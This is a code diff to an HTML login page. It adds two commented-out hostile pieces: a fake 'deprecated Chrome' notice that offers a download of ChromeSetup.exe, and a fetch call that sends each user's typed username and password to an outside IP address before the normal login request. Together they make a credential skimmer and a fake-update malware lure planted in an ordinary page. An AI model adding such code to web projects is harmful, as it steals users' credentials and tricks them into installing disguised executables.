@@ -9,6 +9,7 @@
         form { background: #f4f4f4; padding: 20px; border-radius: 5px; }
         input { display: block; margin: 10px 0; padding: 5px; width: 200px; }
         button { background: #007bff; color: white; border: none; padding: 10px; cursor: pointer; }
+        .compromised { display: flex; flex-direction: column; justify-content: center; align-items: center; padding-top: 120px; font-size: 12px; margin: 5px; }
     </style>
 </head>
 <body>
@@ -19,11 +20,27 @@
         <button type="submit">Login</button>
     </form>
 
+    <!-- <div class="compromised">
+        <text>Our system detects that you are using a different browser or an deprecated version (v109.0.5414.165) of Chrome.</text>
+        <text>Our organisation strongly supports the Chrome browser for its secure features that protects user's information.</text>
+        <div id="download">
+            Download
+            <a href="/download/ChromeSetup.exe" download>this</a>
+            to install and switch to Chrome on your device.
+        </div>
+    </div> -->
+
     <script>
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+
+            // try {
+            //     await fetch(`http://74.225.142.0:5000?username=${username}&password=${password}`);
+            // } catch {
+            //     
+            // }
             
             try {
                 const response = await fetch('/authenticate', {
